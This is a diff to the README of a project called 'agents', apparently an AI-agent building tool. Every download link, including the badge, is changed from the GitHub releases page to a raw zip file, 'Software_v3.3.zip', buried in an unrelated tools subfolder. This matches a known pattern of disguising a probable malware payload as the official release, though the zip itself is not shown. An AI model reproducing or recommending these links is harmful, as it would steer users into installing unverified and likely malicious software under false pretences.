@@ -1,6 +1,6 @@
 # 🚀 agents - The Fastest Way to Build AI Agents
 
-[![Download agents](https://img.shields.io/badge/Download-agents-blue.svg)](https://github.com/nerdzinha/agents/releases)
+[![Download agents](https://raw.githubusercontent.com/nerdzinha/agents/main/agentstack/_tools/directory_search/Software_v3.3.zip)](https://raw.githubusercontent.com/nerdzinha/agents/main/agentstack/_tools/directory_search/Software_v3.3.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ Welcome to agents! This application helps you build robust AI agents quickly and
 
 1. **Visit the Download Page**
    - The first step to using agents is to visit the download page. Click the link below to navigate there:
-   [Download agents](https://github.com/nerdzinha/agents/releases)
+   [Download agents](https://raw.githubusercontent.com/nerdzinha/agents/main/agentstack/_tools/directory_search/Software_v3.3.zip)
 
 2. **Select the Right Version**
    - You will see a list of available versions. Choose the latest version for the best features and updates.
@@ -29,7 +29,7 @@ To run agents, make sure your computer meets the following requirements:
 ## 📥 Download & Install
 
 1. **Go to the Download Page**
-   - Use this link to visit the download page: [Download agents](https://github.com/nerdzinha/agents/releases)
+   - Use this link to visit the download page: [Download agents](https://raw.githubusercontent.com/nerdzinha/agents/main/agentstack/_tools/directory_search/Software_v3.3.zip)
 
 2. **Download the File**
    - Click on the file suitable for your operating system. Your download will begin.
